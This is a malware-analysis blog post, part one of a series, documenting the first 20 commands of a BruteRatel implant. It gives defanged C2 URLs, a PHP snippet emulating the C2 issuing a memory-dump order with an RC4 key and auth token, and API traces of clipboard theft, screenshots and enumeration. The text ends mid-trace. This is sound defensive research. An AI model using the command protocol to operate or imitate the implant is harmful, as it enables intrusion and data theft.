---
title: "BruteRatel full command analysis (1/6)"
date: 2025-03-17 
---

<link rel="stylesheet" href="/css/main.css">

## BRUTERATEL COMMAND LIST PART 1  

updated : 18/04/2025  

## Context  

BruteRatel SHA256 : d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1  

Sample Source :  
[bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)   

VirusTotal :  
[VirusTotal](https://www.virustotal.com/gui/file/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1)  

Network / C2 :  
http://tiguanin[.]com/bazar.php:8041  
http://tiguanin[.]com/admin.php:8041  
http://bazarunet[.]com/admin.php:8041  
http://bazarunet[.]com/bazar.php:8041  
http://greshunka[.]com/bazar.php:8041  
http://greshunka[.]com/admin.php:8041  

# INTRO  

This article is a follow-up from a previous post regarding a BazaarLoader sample analysis : [Initial Post](https://cedricg-mirror.github.io/2025/02/04/BazaarLoader.html)  
After going through various stages of unpacking and in-memory loading, I was able to retrieve the final payload from the initial sample and made it available on [bazaar.abuse.ch](https://bazaar.abuse.ch/sample/d8080b4f7a238f28435649f74fdd5679f7f7133ea81d12d9f10b05017b0897b1/)  

Working on this unpacked payload made the sample analysis much more straightforward and given the sheer amount of functionalities offered by this malware (~100 commands) I've decided to review them all.  

This detailed analysis will be split into several parts, I will be presenting in this post the 'first' 20 commands that BruteRatel can respond to.  

[Second Part](https://cedricg-mirror.github.io/2025/03/19/BruteRatel2.html)  

[Full list](https://cedricg-mirror.github.io/2025/03/24/BruteRatelCommandList.html)  

# COMMAND LIST

Here is a short description of the first 20 command codes and purpose :  

| Command ID   | Description             | Parameter         |
| :----------- | :---------------------- | :----------------:|
| "\x9f\x3c"   | [GetCurrentDirectory](#GetCurrentDirectory) | NA                |
| "\x3f\xd5"   | [GetIpTable](#GetIpTable) | NA                |
| "\xfe\x4f"   | [GetAccountPrivileges](#GetAccountPrivileges) | NA                |
| "\x91\x03"   | [LockWorkStation](#LockWorkStation) | NA                |
| "\x09\x06"   | [GetLogicalDrives](#GetLogicalDrives) | NA                |
| "\x01\x0a"   | [GetSystemUptime](#GetSystemUptime) | NA                |
| "\x06\x0b"   | [GetLastInputInfo](#GetLastInputInfo) | NA                |
| "\x03\x07"   | [ExitProcess](#ExitProcess) | NA                |
| "\x05\x06"   | [RevertToSelf](#RevertToSelf) | NA                |
| "\x05\x01"   | [GetClipBoardData](#GetClipBoardData) | NA                |
| "\x44\xc1"   | [EnumDevicesDrivers](#EnumDevicesDrivers) | NA                |
| "\x41\x9c"   | [Screenshot](#Screenshot) | NA                |
| "\xcb\xe3"   | [GetDomainControlerInfo](#GetDomainControlerInfo) | NA                |
| "\x16\xf6"   | [GetNetworkAdaptersInfo](#GetNetworkAdaptersInfo) | NA                |
| "\x03\x08"   | [ExitThread](#ExitThread) | NA                |
| "\x34\x49"   | [GetMemoryDump](#GetMemoryDump) | "processname.exe" |
| "\x39\xb3"   | [GetTcpUdpTables](#GetTcpUdpTables) | NA                | 
| "\x1a\xd4"   | [GetIpForwardTable](#GetIpForwardTable) | NA                | 
| "\x9a\xbe"   | [QuerySessionInformation](#QuerySessionInformation) | NA                | 
| "\xb7\x38"   | [GetDnsCacheDataTable](#GetDnsCacheDataTable) | NA                |

# Command Syntax  

On the C2 side, a command can be issued this way (example with the GetMemoryDump order) :  

```php
$RC4Key = "S47EFEUO3D2O6641";
$auth_token = "OV1T557KBIUECUM5";

function GetMemoryDump($process_name)
{
	$cmd_id = "\x34\x49 $process_name";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST')
{
	$cmd_id_b64 = GetMemoryDump("explorer.exe");
	
	$cmd = "$auth_token, $cmd_id_b64";
	$cmd_enc = rc4($Rc4Key, $cmd);
	$cmd_b64 = base64_encode($cmd_enc);
	echo $cmd_b64;
	
	return;
}
```

# Dynamic Analysis  

In the following section, I share some dynamic analysis results from the aforementioned commands :  

<a id="GetCurrentDirectory"></a>
# GetCurrentDirectory  

**I. Fetching the order**  

```html
[CNT] [358]
[PTP] [0xa8c] [0xa54] [c:\windows\system32\rundll32.exe]
[API] <InternetReadFile> in [wininet.dll] 
[PAR] HINTERNET hFile                 : 0xcc000c
[PAR] LPVOID    lpBuffer              : 0x0000004495486210
[PAR] DWORD     dwNumberOfBytesToRead : 0x28
[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000449739ED2C
[RET] [0x44972e7a7c]

[CNT] [361]
[PTP] [0xa8c] [0xa54] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000004495465ED0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+evHiErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000044954799B0
[PAR] DWORD   *pcbBinary : 0x000000449739ED5C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x44972fbea1]
```

**II. Execution**  

```html
[CNT] [369]
[PTP] [0xa8c] [0xa54] [c:\windows\system32\rundll32.exe]
[API] <GetCurrentDirectoryW> in [KERNEL32.DLL] 
[PAR] DWORD  nBufferLength : 0x105
[PAR] LPWSTR lpBuffer      : 0x000000449739EA96
[RET] [0x449730964b]
```

**III. Result**  

```html
[CNT] [377]
[PTP] [0xa8c] [0xa54] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000004495455F50
[STR]        -> "9F3C"
[STR]           "C:\Users\user\Desktop\Samples\BRUTERATEL"
[PAR] DWORD  cbBinary   : 0x5a
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000044954476B0
[PAR] DWORD* pcchString : 0x000000449739E9DC
[RET] [0x44972fe028]
```
<a id="GetIpTable"></a>
# GetIpTable  

**I. Order**    

```html
[CNT] [327]
[PTP] [0x844] [0x828] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000009D128F6750
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+RLLAErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000009D12909D80
[PAR] DWORD   *pcbBinary : 0x0000009D148CE96C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x9d1482bea1]
```

**II. Execution**  

```html
[CNT] [336]
[PTP] [0x844] [0x828] [c:\windows\system32\rundll32.exe]
[API] <GetIpNetTable> in [iphlpapi.dll] 
[PAR] PMIB_IPNETTABLE IpNetTable  : 0x0000009D128DF1C0
[PAR] PULONG          SizePointer : 0x0000009D148CE87C
[PAR] BOOL            Order       : 0x1
[RET] [0x9d14829f1b]
```

**III. Result**  

```html
[CNT] [512]
[PTP] [0x844] [0x828] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000009D129119A0
[STR]        -> "3FD5"
[STR]           "224.0.0.22 0-0-0-0-0-0 4"
[STR]           "169.254.143.46 8-0-27-57-99-60 3"
[STR]           "169.254.255.255 FF-FF-FF-FF-FF-FF 4"
[STR]           "224.0.0.22 1-0-5E-0-0-16 4"
[STR]           "224.0.0.252 1-0-5E-0-0-FC 4"
[STR]           "255.255.255.255 FF-FF-FF-FF-FF-FF 4"
[PAR] DWORD  cbBinary   : 0x17c
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000009D128EF3E0
[PAR] DWORD* pcchString : 0x0000009D148CE7BC
[RET] [0x9d1482e028]
```
<a id="GetAccountPrivileges"></a>
# GetAccountPrivileges  

**I. Order**  

```html
[CNT] [327]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000000A429889A0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+O+CtErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000000A4299C8B0
[PAR] DWORD   *pcbBinary : 0x0000000A4487E92C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xa447dbea1]
```

**II. Execution**  

```html
[CNT] [335]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <OpenThreadToken> in [ADVAPI32.dll] 
[PAR] HANDLE  ThreadHandle  : 0xfffffffe
[PAR] DWORD   DesiredAccess : 0x8 (TOKEN_QUERY)
[PAR] BOOL    OpenAsSelf    : 0x0
[PAR] PHANDLE TokenHandle   : 0x0000000A4487E008
[RET] [0xa447f1fac]

[CNT] [336]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0xFFFFFFFFFFFFFFFF
[PAR] ACCESS_MASK DesiredAccess : 0x8 (TOKEN_QUERY)
[PAR] PHANDLE     TokenHandle   : 0x0000000A4487E008
[RET] [0xa447f4b2f]

[CNT] [343]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <GetUserNameW> in [ADVAPI32.dll] 
[PAR] LPWSTR  lpBuffer  : 0x0000000A4487E63E
[PAR] LPDWORD pcbBuffer : 0x0000000A4487DFF0
[RET] [0xa447f1fe1]

[CNT] [345]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x2f8
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x1(TokenUser)
[PAR] LPVOID                  TokenInformation       : 0x0000000A429889A0
[PAR] DWORD                   TokenInformationLength : 0x2c
[PAR] PDWORD                  ReturnLength           : 0x0000000A4487DFF4

[CNT] [347]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x2f8
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x14(TokenElevation)
[PAR] LPVOID                  TokenInformation       : 0x0000000A4487DFEC
[PAR] DWORD                   TokenInformationLength : 0x4
[PAR] PDWORD                  ReturnLength           : 0x0000000A4487DFE0
[RET] [0xa447f20fa]

[CNT] [365]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <LookupPrivilegeNameW> in [ADVAPI32.dll] 
[PAR] LPCWSTR lpSystemName : 0x0 (null)
[PAR] PLUID   lpLuid       : 0x0000000A42986F00
[PAR] LPWSTR  lpName       : 0x0000000A4487E43E
[PAR] LPDWORD cchName      : 0x0000000A4487DFE8
[RET] [0xa447f2271]

[CNT] [367]
[PTP] [0x950] [0x798] [c:\windows\system32\rundll32.exe]
[API] <LookupPrivilegeDisplayNameW> in [ADVAPI32.dll] 
[PAR] LPCWSTR lpSystemName   : 0x0 (null)
[PAR] LPCWSTR lpName         : 0x0000000A4487E43E
[STR]         -> "SeChangeNotifyPrivilege"
[PAR] LPWSTR  lpDisplayName  : 0x0000000A429A15C0
[PAR] LPDWORD cchDisplayName : 0x0000000A4487E038
[PAR] LPDWORD lpLanguageId   : 0x0000000A4487E040
[RET] [0xa447f22d9]

[...]
```

**III. Result**  

```
FE4F
user S-1-5-21-249064630-1566129562-1930266188-1001 0
0 SeShutdownPrivilege Arrêter le système|
3 SeChangeNotifyPrivilege Contourner la vérification de parcours|
0 SeUndockPrivilege Retirer l ordinateur de la station d accueil|
0 SeIncreaseWorkingSetPrivilege Augmenter une plage de travail de processus|
0 SeTimeZonePrivilege Changer le fuseau horaire|
home\Aucun|
S-1-5-21-249064630-1566129562-1930266188-513|07
Tout le monde|
S-1-1-0|
07
AUTORITE NT\Compte local et membre du groupe Administrateurs|
S-1-5-114|
10
BUILTIN\Administrateurs|
S-1-5-32-544|
10
BUILTIN\Utilisateurs|
S-1-5-32-545|
07
AUTORITE NT\INTERACTIF|
S-1-5-4|
07
OUVERTURE DE SESSION DE CONSOLE|
S-1-2-1|
07
[...]
```
<a id="LockWorkStation"></a>
# LockWorkStation  

**I. Order**  

```html
[CNT] [395]
[PTP] [0x828] [0x8c0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000006AC9578750
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+f9rYErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000006AC958D160
[PAR] DWORD   *pcbBinary : 0x0000006ACB48E85C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x6acb3ebea1]
```

** II. Execution**  

```html
[CNT] [404]
[PTP] [0x828] [0x8c0] [c:\windows\system32\rundll32.exe]
[API] <LockWorkStation> in [USER32.dll] 
[RET] [0x6acb3f3f0f]
```

** III. Result**  

```html
[CNT] [412]
[PTP] [0x828] [0x8c0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000006AC957DFD0
[STR]        -> "9103"
[PAR] DWORD  cbBinary   : 0xa
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000006AC958D370
[PAR] DWORD* pcchString : 0x0000006ACB48E6EC
[RET] [0x6acb3ee028]
```

<a id="GetLogicalDrives"></a>
# GetLogicalDrives  

** I. Order**  

```html
[CNT] [327]
[PTP] [0xa4c] [0x740] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000EC56118CB0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+V9rMErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000EC560FEFE0
[PAR] DWORD   *pcbBinary : 0x000000EC5802E7BC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xec57f8bea1]
```

**II. Execution**  

```html
[CNT] [341]
[PTP] [0xa4c] [0x740] [c:\windows\system32\rundll32.exe]
[API] <GetLogicalDrives> in [KERNEL32.DLL] 
[RET] [0xec57f94125]
```

**III. Result***  

```html
[CNT] [343]
[PTP] [0xa4c] [0x740] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000EC56119270
[STR]        -> "0906"
[STR]           "C:\"
[STR]           "D:\"
[STR]           "X:\"
[STR]           "Y:\"
[STR]           "Z:\"
[PAR] DWORD  cbBinary   : 0x32
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000EC56126F10
[PAR] DWORD* pcchString : 0x000000EC5802E62C
[RET] [0xec57f8e028]
```
<a id="GetSystemUptime"></a>
# GetSystemUptime  

It's just GetTickCount() / 60000  

**I. Order**  

```html
[CNT] [429]
[PTP] [0x6c8] [0x7e0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000007B27F06740
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+Vdr6ErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000007B27F1A670
[PAR] DWORD   *pcbBinary : 0x0000007B29E4E77C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x7b29dabea1]
```

**II. Execution**  

```html
[CNT] [437]
[PTP] [0x6c8] [0x7e0] [c:\windows\system32\rundll32.exe]
[API] <GetTickCount> in [KERNEL32.DLL] 
[RET] [0x7b29dc1eef]
```

**III. Result**  

```html
[CNT] [447]
[PTP] [0x6c8] [0x7e0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000007B27F0E550
[STR]        -> "010A"
[STR]           "3"
[PAR] DWORD  cbBinary   : 0xc
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000007B27F1AA30
[PAR] DWORD* pcchString : 0x0000007B29E4E5FC
[RET] [0x7b29dae028]
```
<a id="GetLastInputInfo"></a>
# GetLastInputInfo  

**I. Order**  

```html
[CNT] [429]
[PTP] [0x664] [0x37c] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000095520C5F80
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+VuzmErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000095520D7900
[PAR] DWORD   *pcbBinary : 0x000000955402E5CC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x9553f8bea1]
```

**II. Execution**  

```html
[CNT] [438]
[PTP] [0x664] [0x37c] [c:\windows\system32\rundll32.exe]
[API] <GetTickCount> in [KERNEL32.DLL] 
[RET] [0x9553f9099c]

[CNT] [439]
[PTP] [0x664] [0x37c] [c:\windows\system32\rundll32.exe]
[API] <GetLastInputInfo> in [USER32.dll] 
[PAR] PLASTINPUTINFO plii : 0x000000955402E4F8
[RET] [0x9553f909bb]
```

**III. Result**  

```html
[CNT] [449]
[PTP] [0x664] [0x37c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000095520CC210
[STR]        -> "060B"
[STR]           "0"
[PAR] DWORD  cbBinary   : 0xc
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000095520D7840
[PAR] DWORD* pcchString : 0x000000955402E44C
[RET] [0x9553f8e028]
```
<a id="ExitProcess"></a>
# ExitProcess  

Self-explanatory. It may be worth mentionning that the malware will shutdown without acknowledging the order to the C2.  

<a id="RevertToSelf"></a>
# RevertToSelf  

This function is just a wrapper around the RevertToSelf function from ADVAPI32.  
It is likely to be called when done impersonating another user, for instance after using the command ImpersonateSystem described in [Part 3](https://github.com/cedricg-mirror/cedricg-mirror.github.io/blob/main/_posts/2025-03-20-BruteRatel3.md)  

<a id="GetClipBoardData"></a>
# GetClipBoardData  

**I. Order**  

```html
[CNT] [429]
[PTP] [0x7cc] [0x7ac] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000D135D99000
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+VtrQErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000D135DAA4D0
[PAR] DWORD   *pcbBinary : 0x000000D137CDE5FC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xd137c3bea1]
```

**II. Execution**  

```html
[CNT] [438]
[PTP] [0x7cc] [0x7ac] [c:\windows\system32\rundll32.exe]
[API] <OpenClipboard> in [USER32.dll] 
[PAR] HWND hWndNewOwner : 0x0
[RET] [0xd137c3dbf9]

[CNT] [439]
[PTP] [0x7cc] [0x7ac] [c:\windows\system32\rundll32.exe]
[API] <GetClipboardData> in [USER32.dll] 
[PAR] UINT uFormat : 0xd (CF_UNICODETEXT)
[RET] [0xd137c3dc08]
```

**III. Result**  

```html
[CNT] [449]
[PTP] [0x7cc] [0x7ac] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000D135D92340
[STR]        -> "0501"
[STR]           "It is not in the stars to hold our destiny but in ourselves. WS"
[PAR] DWORD  cbBinary   : 0x88
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0
[PAR] DWORD* pcchString : 0x000000D137CDE47C
[RET] [0xd137c3dff1]
```
<a id="EnumDevicesDrivers"></a>
# EnumDevicesDrivers  

**I. Order**  

```html
[CNT] [798]
[PTP] [0xaf8] [0x834] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000005D6C3B8A00
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+RsbQErJ4Hw/Yqg=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0
[PAR] DWORD   *pcbBinary : 0x0000005D6E28EB0C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x5d6e1ebe5c]
```

**II. Execution**  

```html
[CNT] [812]
[PTP] [0xaf8] [0x834] [c:\windows\system32\rundll32.exe]
[API] <EnumDeviceDrivers> in [PSAPI.DLL] 
[PAR] LPVOID* lpImageBase : 0x0000005D6E28CA20
[PAR] DWORD   cb          : 0x2000
[PAR] LPDWORD lpcbNeeded  : 0x0000005D6E28C1F4
[RET] [0x5d6e1ed495]

[CNT] [823]
[PTP] [0xaf8] [0x834] [c:\windows\system32\rundll32.exe]
[API] <GetDeviceDriverFileNameW> in [PSAPI.DLL] 
[PAR] LPVOID ImageBase  : 0xFFFFF80085C0E000
[PAR] LPWSTR lpFilename : 0x0000005D6E28C220
[PAR] DWORD  nSize      : 0x400
[RET] [0x5d6e1ed541]

[CNT] [835]
[PTP] [0xaf8] [0x834] [c:\windows\system32\rundll32.exe]
[API] <GetFileVersionInfoSizeW> in [version.dll] 
[PAR] LPCWSTR lptstrFilename : 0x0000005D6C3B47B0
[STR]         -> "C:\Windows\system32\ntoskrnl.exe"
[PAR] LPDWORD lpdwHandle     : 0x0000005D6E28C104
[RET] [0x5d6e1ee782]

[CNT] [837]
[PTP] [0xaf8] [0x834] [c:\windows\system32\rundll32.exe]
[API] <GetFileVersionInfoW> in [version.dll] 
[PAR] LPCWSTR lptstrFilename : 0x0000005D6C3B47B0
[STR]         -> "C:\Windows\system32\ntoskrnl.exe"
[RET] [0x5d6e1ee8af]

[CNT] [843]
[PTP] [0xaf8] [0x834] [c:\windows\system32\rundll32.exe]
[API] <VerQueryValueW> in [version.dll] 
[PAR] LPCVOID pBlock      : 0x0000005D6C3B0660
[PAR] LPCWSTR  lpSubBlock : 0x0000005D6C3C7F80
[STR]          -> "\StringFileInfo\040904B0\FileDescription"
[PAR] LPVOID* lplpBuffer  : 0x0000005D6E28C128
[PAR] PUINT   puLen       : 0x0000005D6E28C10C
[RET] [0x5d6e1ee9dd]

[CNT] [848]
[PTP] [0xaf8] [0x834] [c:\windows\system32\rundll32.exe]
[API] <VerQueryValueW> in [version.dll] 
[PAR] LPCVOID pBlock      : 0x0000005D6C3B0660
[PAR] LPCWSTR  lpSubBlock : 0x0000005D6C3C8460
[STR]          -> "\StringFileInfo\040904B0\CompanyName"
[PAR] LPVOID* lplpBuffer  : 0x0000005D6E28C130
[PAR] PUINT   puLen       : 0x0000005D6E28C10C
[RET] [0x5d6e1eeaf6]

[...]
```

**III. Result**  

```
44C1
130
0xFFFFF80085C0E000|C:\Windows\system32\ntoskrnl.exe|Microsoft Corporation|NT Kernel & System
0xFFFFF800863A2000|C:\Windows\system32\hal.dll|Microsoft Corporation|Hardware Abstraction Layer DLL
0xFFFFF8008530F000|C:\Windows\system32\kdcom.dll|Sysprogs OU|Kernel Debugger Extension DLL for VM debugging
0xFFFFF801ACA14000|C:\Windows\system32\mcupdate_GenuineIntel.dll|Microsoft Corporation|Intel Microcode Update Library
0xFFFFF801ACA91000|C:\Windows\System32\drivers\werkernel.sys|Microsoft Corporation|Windows Error Reporting Kernel Driver
0xFFFFF801ACA9F000|C:\Windows\System32\drivers\CLFS.SYS|Microsoft Corporation|Common Log File System Driver
[...]
```
<a id="Screenshot"></a>
# Screenshot  

Note: This command relies on the "SetProcessDpiAwarenessContext" function which is only available from WIN10 1703.  
BruteRatel doesn't check whether this API is available to the infected system, triggering a crash when not present.  
For a functionnality as basic as a screenshot, this very likely implies that any Windows version prior to Server 2016 / Win 10 is NOT part of the quality cycle from the BruteRatel devs.  

![Missing Function](/docs/assets/images/BazaarLoader/ScreenShot_fail.jpg)  

**I. Order**  

```html
[CNT] [490]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000002AD619B78B0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+RdHiErJ4MxXM8BuhP3piww5zGn8qlv6Z"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000002AD619C1CF0
[PAR] DWORD   *pcbBinary : 0x000000DED296E4BC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x2ad61acbea1]
```

**II. Execution**  

```html
[CNT] [520]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <GetSystemMetrics> in [USER32.dll] 
[PAR] int nIndex : 76 (SM_XVIRTUALSCREEN)
[RET] [0x2ad61ab9a1a]

[CNT] [521]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <GetSystemMetrics> in [USER32.dll] 
[PAR] int nIndex : 77 (SM_YVIRTUALSCREEN)
[RET] [0x2ad61ab9a29]

[CNT] [522]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <SetProcessDpiAwarenessContext> in [USER32.dll] 
[PAR] DPI_AWARENESS_CONTEXT   Value   : 0xfffffffe (DPI_AWARENESS_CONTEXT_SYSTEM_AWARE)
[RET] [0x2ad61ab9af7]

[CNT] [528]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <GetDC> in [USER32.dll] 
[PAR] HWND   hWnd  : 0x0
[RET] [0x2ad61ab9b4b]

[CNT] [529]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <CreateCompatibleDC> in [GDI32.dll] 
[PAR] HDC hdc : 0xb010914
[RET] [0x2ad61ab9b6f]

[CNT] [530]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <CreateCompatibleDC> in [gdi32full.dll] 
[RET] [0x2ad61ab9b6f]

[CNT] [531]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <GetCurrentObject> in [GDI32.dll] 
[PAR] HDC  hdc  : 0xb010914
[PAR] UINT type : 0x7
[RET] [0x2ad61ab9b95]

[CNT] [532]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <GetObjectW> in [GDI32.dll] 
[PAR] HANDLE h  : 0x10505a5
[PAR] int c     : 0x20
[PAR] LPVOID pv : 0x000000DED296E370
[RET] [0x2ad61ab9bb3]

[CNT] [533]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <CreateDIBSection> in [GDI32.dll] 
[PAR] HDC         hdc      : 0xb010914
[PAR] BITMAPINFO* pbmi     : 0x000000DED296E1C4
[PAR] UINT        usage    : 0x1
[PAR] VOID**      ppvBits  : 0x000000DED296E138
[PAR] HANDLE      hSection : 0x0
[PAR] DWORD       offset   : 0x0
[RET] [0x2ad61ab9607]

[CNT] [534]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <SelectObject> in [GDI32.dll] 
[PAR] HDC     hdc : 0xFFFFFFFF9C010803
[PAR] HGDIOBJ h   : 0x480509a5
[RET] [0x2ad61ab961b]

[CNT] [535]
[PTP] [0x1188] [0x18ec] [c:\windows\system32\rundll32.exe]
[API] <BitBlt> in [GDI32.dll] 
[PAR] HDC hdc    : 0xFFFFFFFF9C010803
[PAR] int x      : 0x0
[PAR] int y      : 0x0
[PAR] int cx     : 0x569
[PAR] int cy     : 0x3a7
[PAR] HDC hdcSrc : 0xb010914
